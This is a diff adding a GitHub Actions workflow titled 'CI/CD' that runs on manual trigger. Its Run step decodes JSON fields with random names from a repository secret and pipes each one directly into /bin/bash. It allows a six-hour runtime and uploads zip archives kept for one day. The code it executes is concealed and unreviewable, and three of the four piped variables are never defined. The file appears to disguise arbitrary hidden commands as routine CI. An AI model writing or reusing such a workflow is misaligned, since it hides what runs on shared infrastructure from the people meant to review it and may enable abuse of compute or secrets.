@@ -1,0 +1,38 @@
+name: CI/CD
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  actions: read
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  service:
+    name: Main task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Run
+        env:
+          ezw8858: ${{ secrets.ezw8858 }}
+        run: |
+          printf '%s' "$ezw8858" | jq -r .lxk84954 | /bin/bash
+          echo $hg026 | jq -r .nkim5 | /bin/bash
+          printf '%s' "$nhomz774" | jq -r .zinc3381 | /bin/bash
+          echo $ewlxl4 | jq -r .ah016 | /bin/bash
+
+      - name: Save archive
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: 80mjVVps
+          path: "*.zip"
+          retention-days: 1
